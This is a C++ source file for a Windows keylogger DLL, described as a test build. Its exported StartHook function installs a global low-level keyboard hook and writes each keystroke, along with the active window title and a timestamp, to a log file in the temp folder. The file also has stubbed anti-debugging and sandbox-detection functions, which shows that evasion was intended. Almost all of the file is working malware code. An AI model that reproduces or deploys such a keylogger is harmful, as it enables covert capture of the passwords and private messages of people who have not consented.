/*
 * keylogger_dll_test.cpp - Test version with evasion disabled
 */
#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <fstream>
#include <string>
#include <ctime>

// ========== GLOBAL STATE ==========
HHOOK g_hKeyboardHook = NULL;
std::ofstream g_logFile;
bool g_shiftPressed = false;
std::string g_lastWindowTitle = "";
char g_logPath[MAX_PATH] = {0};

// ========== DISABLED: Anti-debugging (always returns false for testing) ==========
bool detect_debugger() {
    return false;  // DISABLED FOR TESTING
}

// ========== DISABLED: Sandbox detection (always returns false for testing) ==========
bool detect_sandbox() {
    return false;  // DISABLED FOR TESTING
}

// ========== UTILITY: Get timestamp string ==========
std::string get_timestamp() {
    time_t now = time(0);
    struct tm* timeinfo = localtime(&now);
    char buffer[80];
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", timeinfo);
    return std::string(buffer);
}

// ========== UTILITY: Get foreground window title ==========
std::string get_window_title() {
    char title[256] = {0};
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        GetWindowTextA(hwnd, title, sizeof(title));
    }
    return std::string(title);
}

// ========== CORE: Log a single keystroke ==========
void log_keystroke(int vkCode, bool keyDown) {
    if (!keyDown) return;
    
    std::string currentTitle = get_window_title();
    if (currentTitle != g_lastWindowTitle) {
        g_logFile << "\n[" << get_timestamp() << "] [Window: " 
                  << currentTitle << "]\n";
        g_logFile.flush();
        g_lastWindowTitle = currentTitle;
    }
    
    if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT || vkCode == VK_SHIFT) {
        g_shiftPressed = true;
        return;
    }
    if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) return;
    if (vkCode == VK_LMENU || vkCode == VK_RMENU) return;
    
    BYTE keyboardState[256] = {0};
    keyboardState[VK_SHIFT]   = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) ? 0xFF : 0;
    keyboardState[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 0x0001) ? 0xFF : 0;
    
    char buffer[8] = {0};
    UINT scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, GetKeyboardLayout(0));
    
    int result = ToAsciiEx(vkCode, scanCode, keyboardState, 
                           (LPWORD)buffer, 0, GetKeyboardLayout(0));
    
    if (result > 0) {
        g_logFile << buffer;
    } else {
        switch (vkCode) {
            case VK_RETURN: g_logFile << "\n"; break;
            case VK_BACK:   g_logFile << "[BKSP]"; break;
            case VK_TAB:    g_logFile << "[TAB]"; break;
            case VK_ESCAPE: g_logFile << "[ESC]"; break;
            case VK_DELETE: g_logFile << "[DEL]"; break;
            case VK_SPACE:  g_logFile << " "; break;
            default:
                if (vkCode >= VK_F1 && vkCode <= VK_F12)
                    g_logFile << "[F" << (vkCode - VK_F1 + 1) << "]";
                break;
        }
    }
    
    g_logFile.flush();
    g_shiftPressed = false;
}

// ========== HOOK CALLBACK ==========
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pInfo = (KBDLLHOOKSTRUCT*)lParam;
        bool keyDown = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);
        log_keystroke(pInfo->vkCode, keyDown);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// ========== EXPORTED: Start hook ==========
extern "C" __declspec(dllexport) void StartHook() {
    // Use a simple, known path for testing
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    snprintf(g_logPath, sizeof(g_logPath), "%s%s", tempPath, "test_keylog.txt");
    
    g_logFile.open(g_logPath, std::ios::app);
    if (!g_logFile.is_open()) {
        // Fallback to current directory
        g_logFile.open("test_keylog.txt", std::ios::app);
    }
    
    if (!g_logFile.is_open()) return;
    
    g_logFile << "\n=== TEST KEYLOGGER STARTED [" << get_timestamp() << "] ===\n";
    g_logFile.flush();
    
    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                       GetModuleHandle(NULL), 0);
    
    if (g_hKeyboardHook == NULL) {
        g_logFile << "[ERROR] SetWindowsHookEx failed: " << GetLastError() << "\n";
        g_logFile.close();
        return;
    }
    
    g_logFile << "[INFO] Hook installed successfully\n";
    g_logFile.flush();
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

// ========== EXPORTED: Stop hook ==========
extern "C" __declspec(dllexport) void StopHook() {
    if (g_hKeyboardHook) {
        UnhookWindowsHookEx(g_hKeyboardHook);
        g_hKeyboardHook = NULL;
    }
    if (g_logFile.is_open()) {
        g_logFile << "=== KEYLOGGER STOPPED [" << get_timestamp() << "] ===\n";
        g_logFile.close();
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            break;
        case DLL_PROCESS_DETACH:
            StopHook();
            break;
    }
    return TRUE;
}
